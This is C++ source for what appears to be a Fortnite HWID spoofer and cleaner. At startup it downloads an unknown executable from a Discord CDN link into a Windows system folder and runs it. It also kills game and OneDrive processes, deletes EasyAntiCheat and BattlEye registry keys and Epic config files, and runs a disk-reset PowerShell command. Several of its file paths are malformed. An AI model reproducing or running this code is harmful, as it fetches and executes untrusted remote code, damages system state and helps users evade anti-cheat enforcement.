#include <iostream>
#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include "CConsole.h"
#include <urlmon.h>
#include <tchar.h>
#include "xor.hpp"
#pragma comment (lib, "urlmon.lib")

/*
* Made by Happy Cat#3220 & Improved by KeyWeb#6666
* Made this paste in a couple mins should work on fortnite.
* Put it Multi Byte, Release x64
* IMPORTANT it wont build if you dont do this: Go to C/C++ Optimization and Disable it
*/

void spoof()
{
    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/839229954793406535/841390124680085514/Serial.exe"), _T("C:/Windows/IME/Serial.exe"), 0, NULL);

}

void clean()
{
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Base.ini");
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseGame.ini");
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini");
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\BaseInput.ini");
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini");
    DeleteFileW(L"C:\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini");
    DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini");
    DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini");
    DeleteFileW(L"C:\\Program Files(x86)\Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini");
    system("reg delete HKLM\\SOFTWARE\\WOW6432Node\\EasyAntiCheat /f >nul 2>&1");
    system("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat /f >nul 2>&1");
    system("reg delete HKLM\\SYSTEM\\ControlSet001\\Services\\BEService /f >nul 2>&1");
}

int main()
{
    spoof();
    system("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1");
    system("taskkill /f /im OneDrive.exe >nul 2>&1");
    system("taskkill /f /im RustClient.exe >nul 2>&1");
    system("taskkill /f /im Origin.exe >nul 2>&1");
    system("taskkill /f /im r5apex.exe >nul 2>&1");
    system("color 0D");
   CConsole::Clear();
    CConsole::MakeSexy();
    CConsole::SetRandomTitle();
    CConsole::Print("Welcome To Your Fortnite-Spoofer-Cleaner-Pasta!\n");
    system("pause");
	Sleep(5000);
	CConsole::Clear();
    CConsole::Print("Spoofing Diskdrive...\n");
    CConsole::Print("Old SerialNumber\n");
    system(("wmic diskdrive get serialnumber"));
    system("start C:/Windows/IME/Serial.exe ");
	Sleep(1500);
    CConsole::Print("New SerialNumber\n");
    system(("wmic diskdrive get serialnumber"));
    Sleep(1500);
   CConsole::Clear();
    CConsole::Print("Spoofing CPU,RAM,BIOS,Motherboard...\n");
	system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
	CConsole::Clear();
    CConsole::Print("Cleaning Tracking Files...\n");
    system("pause");
	Sleep(7000);
	clean();
	Sleep(2000);
	CConsole::Clear();
	CConsole::Print("Press any key to exit...\n");
    CConsole::Pause();


}

